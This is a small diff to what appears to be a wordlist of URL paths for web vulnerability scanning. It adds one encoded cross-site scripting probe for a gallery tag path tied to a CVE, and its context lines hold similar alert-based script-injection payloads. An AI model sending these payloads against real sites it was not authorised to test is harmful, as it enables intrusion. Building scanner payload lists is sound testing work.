@@ -102,3 +102,4 @@
 /?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
 /wp-login.php
 /srv/eng/catalog.search?uiconfig=%28alert%281%29%2C%7B%7D%29
+/ngg_tag/cve-2026-28141%22%3E%3Csvg%2Fonload%3Dalert%60{{marker}}%60%3E/
